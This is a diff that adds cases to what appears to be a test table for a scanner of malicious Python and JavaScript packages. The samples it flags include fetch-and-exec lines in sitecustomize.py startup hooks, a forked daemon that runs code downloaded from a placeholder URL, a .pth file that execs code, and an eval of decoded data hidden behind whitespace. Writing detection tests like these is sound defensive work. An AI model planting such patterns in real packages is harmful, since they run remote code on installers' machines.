@@ -165,6 +165,22 @@ CASES = {
     "setup_net_import": ("setup.py", "import requests", "import os"),
     "setup_ctypes_pty": ("setup.py", "lib = ctypes.CDLL(path)", "lib = load(path)"),
     "pth_exec_line": ("x.pth", "import os; exec(open('a').read())", "/usr/lib/extra"),
+    "pth_import_line": ("x.pth", "import helper", "/usr/lib/extra"),
+    "py_startup_hook_file": (
+        "pkg-1.0.data/purelib/sitecustomize.py",
+        "import os\nos.environ.setdefault('X', '1')",
+        "# nothing runs here",
+    ),
+    "startup_hook_payload": (
+        "sitecustomize.py",
+        "from urllib.request import urlopen\nexec(urlopen(U).read())",
+        "import os\nos.environ.setdefault('X', '1')",
+    ),
+    "py_daemon_fetch_exec": (
+        "x.py",
+        "if os.fork():\n    raise SystemExit\nos.setsid()\nexec(urlopen(U).read())",
+        "if os.fork():\n    raise SystemExit\nos.setsid()\ndata = urlopen(U).read()",
+    ),
     "pyproject_backend_path": ("pyproject.toml", 'backend-path = ["."]', 'build-backend = "setuptools.build_meta"'),
     "h_raw_ip": ("lib/i.js", "const h = '45.9.1.2';", "const h = '10.0.0.1';"),
     "js_hidden_whitespace": ("lib/w.js", "x = 1;" + WS + "eval(atob(p))", "x = 1;" + WS + "y = 2"),
